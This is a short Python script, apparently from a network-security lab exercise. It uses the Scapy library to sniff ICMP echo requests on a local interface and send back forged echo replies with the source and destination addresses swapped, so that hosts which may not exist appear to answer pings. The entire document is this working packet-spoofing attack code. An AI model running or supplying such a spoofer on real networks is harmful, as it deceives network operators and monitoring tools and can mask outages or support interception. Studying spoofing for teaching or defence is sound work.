from scapy.layers.inet import IP, ICMP
from scapy.all import *


def spoofingICMP(pkt):
    if pkt[ICMP].type == 8:
        dst = pkt[IP].dst
        src = pkt[IP].src
        ihl = pkt[IP].ihl
        id = pkt[ICMP].id
        seq = pkt[ICMP].seq
        load = pkt[Raw].load
        ans = IP(src=dst, dst=src, ihl=ihl) / ICMP(type=0, id=id, seq=seq) / load
        send(ans)

pkt = sniff(iface='enp0s3', filter='icmp', prn=spoofingICMP)